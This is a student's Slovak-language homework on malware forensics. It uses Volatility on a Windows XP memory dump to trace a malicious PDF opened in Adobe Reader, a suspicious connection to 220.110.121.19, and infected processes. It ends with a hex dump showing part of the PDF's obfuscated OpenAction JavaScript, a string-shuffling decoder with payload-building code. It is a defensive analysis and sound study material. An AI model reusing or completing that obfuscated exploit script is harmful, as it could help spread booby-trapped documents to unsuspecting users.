PV204, Homework Malware Analyze
Jerguš Lysý (374217)

Najprv je dobre vediet co idem analyzovat, resp. aky OS bezi na infokovanom PC.

$ python vol.py imageinfo -f homework.vmem
Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)

S najvacsou pravdepodobnostou ide o OS WinXP x86. Dalsim krokom je vypis stromu beziacich procesov v case dumpu. Tam mozem skontrolvat divne spravanie niektorych well-know procesov, prip. odhalit novy podozrivy proces.

$ python vol.py pstree -f homework.vmem

Podozriva cast vystupu je
.... 0x82042548:explorer.exe                         1620   1604     14    331 2013-05-05 16:45:45 UTC+0000
..... 0x82183a78:AcroRd32.exe                        1952   1620      0 ------ 2013-05-05 16:45:54 UTC+0000
...... 0x81fe7770:AcroRd32.exe                        420   1952      0 ------ 2013-05-05 16:47:02 UTC+0000
...... 0x82166868:AdobeARM.exe                       1908   1952      1     84 2013-05-05 16:46:31 UTC+0000
..... 0x82078020:VBoxTray.exe                        1704   1620      7     45 2013-05-05 16:45:45 UTC+0000
..... 0x821b4c18:AcroRd32.exe                         708   1620      7    244 2013-05-05 16:47:12 UTC+0000
..... 0x8217c650:AdobeARM.exe                        1760   1620      7    157 2013-05-05 16:45:45 UTC+0000

Zreme bol otvoreny PDF subor pomocou ADOBE Acrobat. Procesy 708 a 1952 vznikli po otvoreni suboru, kde jeden z nich je samotny Reader pre zobrazenie PDF a druhy je Protected mode pre obecnu kontrolu pristupovych operacii. Kazdopadne proces 1952 pod sebou spusta novy proces 420 a 1908, ktore vznikli po otvoreni suboru - toto moze byt potencialny zdroj malware.

Dalsim krokom by som skontroloval podozrive mustexy, ktore by som teoreticky mohol vyhladat v zozname znamych mien malware mutexov.

$ python vol.py handles -t Mutant -f homework.vmem
0x821a6f48   1760       0xc8   0x1f0001 Mutant           c:!documents and settings!malware analyst!local settings!temporary internet files!content.ie5!
0x8208a9e0   1760       0xd0   0x1f0001 Mutant           c:!documents and settings!malware analyst!cookies!
0x8208a6f8   1760       0xd8   0x1f0001 Mutant           c:!documents and settings!malware analyst!local settings!history!history.ie5!
0x82199678   1296       0x24   0x1f0001 Mutant           SHIMLIB_LOG_MUTEX
0x81fc2758   1840       0x3c   0x1f0001 Mutant           wscntfy_mtx
0x82371070   1908       0x78   0x100000 Mutant           _!MSFTHISTORY!_
0x821a6f48   1908       0x80   0x100000 Mutant           c:!documents and settings!malware analyst!local settings!temporary internet files!content.ie5!
0x8208a9e0   1908       0x88   0x100000 Mutant           c:!documents and settings!malware analyst!cookies!
0x8208a6f8   1908       0x90   0x100000 Mutant           c:!documents and settings!malware analyst!local settings!history!history.ie5!
0x82187180   1908       0x9c   0x100000 Mutant           WininetStartupMutex

Tato cast vystupu je podozriva, resp. mutexy vsetkych procesov su podozrive. Rovnake mutexy najdem aj pre proces 1620, co nevesti nic dobreho. Teraz je takmer iste ze v systeme sa nachadza malware. Je dobre teraz prezriet sockety, ktore boli alebo su otvorene v case dump.

$ python vol.py connscan -f homework.vmem
0x023b7ce8 10.0.2.15:1033            220.110.121.19:80         1908

Proces 1908 vytvaral spojenie na adresu 220.110.121.19 a port 80. Adresu som lokalizoval niekde v Japonsku. AdobeARM by sa mal starat o aktualizacie a teda pripajat sa na niektory zo serverov ADOBE. V zozname legitimnych adries nie je ziadna takato adresa a preto pojde zrejme o neziaduce spojenia, ktore vyuziva malware. Proces 1760 nevytvaral ziadne spojenie ani v minulosti. Je zrejme ze ide o spravny proces, ktoreho cinnost bola zablokovana - autor malwaru sa chce ujistit ze Acrobat Reader nebude aktualizovany.
Dalej je dobre pozriet na memory dump procesu 1908 a pozret ci nenajdem nejake podozrive retazce.

$ python vol.py memdump -p 1908 -D mdump/ -f homework.vmem
$ strings mdump/1908.dmp | grep -E '220.110.121.19|http'

Po filtrovani dumpu na retazce obsahujuce http alebo podozrivu IP adresu najdem zaujimavy vystup:
)http://cybertrust.omniroot.com/repository0
4http://www.public-trust.com/cgi-bin/CRL/2018/cdp.crl0
.http://crl.omniroot.com/PublicSureServerSV.crl0
)http://cybertrust.omniroot.com/repository0
1http://cdp1.public-trust.com/CRL/Omniroot2025.crl0
)http://cybertrust.omniroot.com/repository0
4http://www.public-trust.com/cgi-bin/CRL/2018/cdp.crl0

a tiez podozrivu adresu
q CKM220.110.121.19

Po aplikovani rovnakeho postupu som zistil ze tieto retazce (http adresy) mozno najst aj v porcese svchost.exe s PID 952, takze tento proces bol taktiez infikovany. To iste plati aj pre proces 1620 (explorer.exe). Okrem toho je mozne vidiet retazec ako http://127.0.0.1:1160/app/index.html, co moze pritomnost virus BlackRat, ktory tento port pouziva.

Teraz je dobre pozriet sa na subory, ktore jednotlive procesy v case dumpu pouzivali.

$ python vol.py handles -t File -f homework.vmem

Podstatny vystup pre mna je:
0x821972a0    708      0x140   0x120089 File             \Device\HarddiskVolume1\Documents and Settings\Malware Analyst\Desktop\test.pdf
0x82067a80    708      0x2fc   0x120089 File             \Device\HarddiskVolume1\DOCUME~1\MALWAR~1\LOCALS~1\Temp\Adobe Reader .pdf

Oba subory boli otvoreny procesom 708 a teda niektore z nich boli infikovane (mozno oba). Mozem vsak este extraktovat pamat procesu a najst skodlivy kod, ktory to vsetko sposobil. Po extraktovani pamate pomocou foremost dostavam niekolko PDF suborov. Vacsinou su to subory s velkostou niekolko bajtov - okrem dvoch, ktore je dobre dalej analyzovat. Po hex dumpu jedneho PDF suboru (toho mensieho) je vysledok prvych bajtov takyto:

00000000  25 50 44 46 2d 31 2e 32  0a 25 e2 e3 cf d3 0a 31  |%PDF-1.2.%.....1|
00000010  20 30 20 6f 62 6a 0a 3c  3c 0a 2f 4c 65 6e 67 74  | 0 obj.<<./Lengt|
00000020  68 20 31 36 30 35 0a 2f  46 69 6c 74 65 72 20 5b  |h 1605./Filter [|
00000030  2f 46 6c 61 74 65 44 65  63 6f 64 65 5d 0a 3e 3e  |/FlateDecode].>>|
00000040  0a 73 74 72 65 61 6d 0a  58 85 ed 59 4d 6f 1b 37  |.stream.X..YMo.7|
00000050  10 bd eb 57 a8 69 3e a8  b4 5e 73 c8 25 77 37 55  |...W.i>..^s.%w7U|
00000060  d5 c6 b5 74 e8 ad 80 6e  71 2f 46 e1 43 81 1a a8  |...t...nq/F.C...|
00000070  91 ff 8f 0e 67 86 43 ae  b4 49 14 5b ae e1 d8 30  |....g.C..I.[...0|
00000080  b0 5a cf f2 9b 8f 6f e6  0d ff 9d 9d 6d 67 a7 1b  |.Z....o.....mg..|
00000090  3b 87 f9 f6 6a e6 ba c6  01 0c 7e 6e f1 4f ff 71  |;...j.....~n.O.q|
000000a0  ad 6f 82 b5 ed 3c f6 ae  81 ce c7 f9 f6 9f d9 87  |.o...<..........|
000000b0  a5 85 95 5b 5a 97 1e 7e  75 e2 97 b6 4d af 81 5e  |...[Z..~u...M..^|
000000c0  1d 3d 7d 32 c4 15 d6 fd  73 fb 3b f6 02 dc cb d0  |.=}2....s.;.....|
000000d0  c4 c1 fb 81 3a c9 ef d8  72 ef 7d 3f 8f b1 6d dc  |....:...r.}?..m.|
000000e0  10 b0 9c 74 01 d4 18 70  27 e9 a7 5d b5 43 4c ed  |...t...p'..].CL.|
000000f0  d9 f9 09 34 1e 1c f8 f9  f6 3c 15 8e a9 70 97 4a  |...4.....<...p.J|
00000100  99 8b cb 05 fd 7c 5c 80  b9 b8 4e ef 4b 7b c6 5f  |.....|\...N.K{._|
00000110  ae 92 e9 66 81 45 71 a8  c9 be 5e a1 e1 8a cb 6c  |...f.Eq...^....l|

Obecne nepripada mi, ze by bolo PDF infikovane. Na druhu stranu, druhy subor sa javi byt celkom infikovany. Cast vystupu je:
00000000  25 50 44 46 2d 31 2e 37  0d 0a 31 20 30 20 6f 62  |%PDF-1.7..1 0 ob|
00000010  6a 0d 0a 3c 3c 0d 0a 09  2f 50 61 67 65 73 20 32  |j..<<.../Pages 2|
00000020  20 30 20 52 0d 0a 09 2f  4e 65 65 64 73 52 65 6e  | 0 R.../NeedsRen|
00000030  64 65 72 69 6e 67 20 74  72 75 65 0d 0a 09 2f 41  |dering true.../A|
00000040  63 72 6f 46 6f 72 6d 20  34 20 30 20 52 0d 0a 09  |croForm 4 0 R...|
00000050  2f 50 65 72 6d 73 20 3c  3c 0d 0a 09 09 2f 55 52  |/Perms <<..../UR|
00000060  33 20 38 20 30 20 52 0d  0a 09 3e 3e 0d 0a 09 2f  |3 8 0 R...>>.../|
00000070  54 79 70 65 20 2f 43 61  74 61 6c 6f 67 0d 0a 09  |Type /Catalog...|
00000080  2f 4f 70 65 6e 41 63 74  69 6f 6e 20 3c 3c 0d 0a  |/OpenAction <<..|
00000090  09 09 2f 4a 53 20 28 5c  6e 30 20 3e 3e 20 30 20  |../JS (\n0 >> 0 |
000000a0  3e 3e 20 30 20 3e 3e 20  30 20 3e 3e 20 30 20 3e  |>> 0 >> 0 >> 0 >|
000000b0  3e 20 30 3b 5c 6e 66 75  6e 63 74 69 6f 6e 20 73  |> 0;\nfunction s|
000000c0  48 4f 47 47 5c 28 63 2c  64 2c 65 5c 29 7b 5c 6e  |HOGG\(c,d,e\){\n|
000000d0  20 20 20 20 76 61 72 20  69 64 78 20 3d 20 64 20  |    var idx = d |
000000e0  25 20 63 2e 6c 65 6e 67  74 68 3b 5c 6e 20 20 20  |% c.length;\n   |
000000f0  20 76 61 72 20 73 20 3d  20 22 22 3b 5c 6e 20 20  | var s = "";\n  |
00000100  20 20 77 68 69 6c 65 20  5c 28 73 2e 6c 65 6e 67  |  while \(s.leng|
00000110  74 68 20 3c 20 63 2e 6c  65 6e 67 74 68 5c 29 7b  |th < c.length\){|
00000120  5c 6e 20 20 20 20 20 20  20 20 73 20 2b 3d 20 63  |\n        s += c|
00000130  5b 69 64 78 5d 3b 5c 6e  20 20 20 20 20 20 20 20  |[idx];\n        |
00000140  69 64 78 20 3d 20 5c 28  69 64 78 20 2b 20 65 5c  |idx = \(idx + e\|
00000150  29 20 25 20 63 2e 6c 65  6e 67 74 68 3b 5c 6e 20  |) % c.length;\n |
00000160  20 20 20 7d 5c 6e 20 20  20 20 72 65 74 75 72 6e  |   }\n    return|
00000170  20 73 3b 5c 6e 7d 5c 6e  30 20 3e 3e 20 30 20 3e  | s;\n}\n0 >> 0 >|
00000180  3e 20 30 20 3e 3e 20 30  20 3e 3e 20 30 20 3e 3e  |> 0 >> 0 >> 0 >>|
00000190  20 30 3b 5c 6e 66 75 6e  63 74 69 6f 6e 20 6f 54  | 0;\nfunction oT|
000001a0  48 45 52 57 49 53 45 5c  28 70 52 45 4e 44 45 4e  |HERWISE\(pRENDEN|
000001b0  44 4f 2c 74 5c 29 7b 5c  6e 20 69 66 5c 28 70 52  |DO,t\){\n if\(pR|
000001c0  45 4e 44 45 4e 44 4f 20  3d 3d 20 73 48 4f 47 47  |ENDENDO == sHOGG|
000001d0  5c 28 27 30 31 34 2e 30  33 31 2e 34 2e 27 2c 33  |\('014.031.4.',3|
000001e0  35 37 31 2c 39 31 37 33  5c 29 5c 29 7b 5c 6e 20  |571,9173\)\){\n |
000001f0  76 61 72 20 72 3d 22 22  3b 5c 6e 72 2b 3d 75 65  |var r="";\nr+=ue|
00000200  5c 28 74 2b 32 2a 32 2a  32 2a 33 2b 31 31 2a 33  |\(t+2*2*2*3+11*3|
00000210  5c 29 3b 5c 6e 72 2b 3d  75 65 5c 28 74 2b 31 31  |\);\nr+=ue\(t+11|
00000220  2a 35 2b 32 5c 29 3b 72  2b 3d 75 65 5c 28 74 2b  |*5+2\);r+=ue\(t+|
00000230  31 39 2a 33 5c 29 3b 72  2b 3d 75 65 5c 28 74 2b  |19*3\);r+=ue\(t+|
00000240  33 2a 31 39 5c 29 3b 72  2b 3d 75 65 5c 28 74 2b  |3*19\);r+=ue\(t+|

Toto je hlavny kamen urazu.
